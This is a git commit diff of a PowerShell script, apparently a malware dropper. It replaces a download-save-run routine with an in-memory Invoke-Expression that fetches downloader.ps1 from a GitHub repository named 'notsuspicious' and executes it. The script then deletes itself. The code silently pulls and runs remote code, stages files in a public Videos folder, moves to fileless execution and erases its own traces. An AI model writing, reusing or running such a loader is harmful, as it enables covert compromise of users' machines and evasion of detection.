017e58c6fea3fc9006958d41902b0218a2f7f6b2
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-03-01 11:33:49 +0100

    Update downloadanduninstall.ps1

--- downloadanduninstall.ps1
+++ downloadanduninstall.ps1
@@ -1,17 +1,5 @@
-# Define the URL of the script to download
-$url = "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1"
-
-# Define the path to save the downloaded script
-$scriptPath = "C:\Users\Public\Videos\downloader.ps1"
-
-# Download the script content
-Invoke-WebRequest -Uri $url -OutFile $scriptPath -UseBasicParsing
-
-# Execute the downloaded script silently
-Start-Process powershell.exe -ArgumentList "-File $scriptPath" -Wait
-
-# Remove the downloaded script file
-Remove-Item $scriptPath -Force
+#._.
+Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1" -UseBasicParsing).Content
 
 # Remove the current script file
 Remove-Item $MyInvocation.MyCommand.Path -Force
